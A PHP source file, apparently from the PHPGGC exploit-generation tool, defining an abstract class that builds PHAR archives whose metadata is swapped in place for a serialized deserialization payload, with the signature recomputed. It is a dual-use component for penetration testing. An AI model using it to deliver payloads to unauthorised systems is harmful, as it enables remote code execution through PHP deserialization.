<?php

namespace PHPGGC\Phar;

/**
 * Abstract class representing a phar file format.
 * Usage:
 * 
 */
abstract class Format
{
    protected $format = '';
	public $data;
    public $parameters = [
        'filename' => 'test.txt',
        'prefix' => ''
    ];

    /**
     * Creates an instance of a PHAR file format.
     * 
     * @param string $metadata PHAR's metadata (serialized payload)
     * @param array $parameters
     */
	public function __construct($metadata, $parameters=[])
	{
		$this->metadata = $metadata;
        $this->parameters = $parameters + $this->parameters;
    }

    /**
     * Generates the contents of the PHAR file.
     *
     * @returns string Content of generated PHAR file
     */
    public function generate()
    {
		$this->generate_dummy_metadata();
        $this->generate_base_phar();
        $this->replace_metadata();
        $this->update_signature();
        return $this->data;
	}

	protected function generate_base_phar()
	{
        $path = (
            sys_get_temp_dir() . DIRECTORY_SEPARATOR .
            'phpggc' . $this->format . '.phar'
        );
        @unlink($path);

		$phar = new \Phar($path);
        $phar->startBuffering();
        $phar->addFromString("dummy", 'test');
        $phar->addFromString($this->parameters['filename'], 'test');
        $phar->setStub(
            $this->parameters['prefix'] .
            '<?php __HALT_COMPILER(); ?>'
        );
        $phar->setMetadata($this->dummy_metadata);
        
        # Since we might generate a new signature, we need to make sure the
        # algorithm is valid
        $phar->setSignatureAlgorithm(\Phar::SHA1);
        $phar->stopBuffering();

        $this->data = file_get_contents($path);
        unlink($path);
	}

	protected function generate_dummy_metadata()
	{
		# We want our fake metadata to have the same size as our serialized
        # payload, so that we can make an in-place replacement in archives
        $dummy_size = strlen($this->metadata) - strlen('s::"";');
        $dummy_size = $dummy_size - strlen($dummy_size);
        $this->dummy_metadata = str_repeat('A', $dummy_size);
	}

	/**
	 * Updates the PHAR signature of the file.
	 * It is format-dependant and therefore abstract.
	 */
	abstract protected function update_signature();

	/**
	 * Makes an in-place replacement at $offset in $data
	 */
    protected function in_place_replace($data, $offset, $change)
    {
        return
        	substr($data, 0, $offset) .
        	$change .
        	substr($data, $offset + strlen($change))
        ;
    }

    /**
     * Returns the signature for given data.
     */
    protected function compute_signature($data)
    {
    	return hex2bin(sha1($data));
    }

    /**
     * Replaces every occurence of the fake metadata by the real one.
     */
    protected function replace_metadata()
    {
    	$this->data = str_replace(
            serialize($this->dummy_metadata), $this->metadata, $this->data
        );
    }
}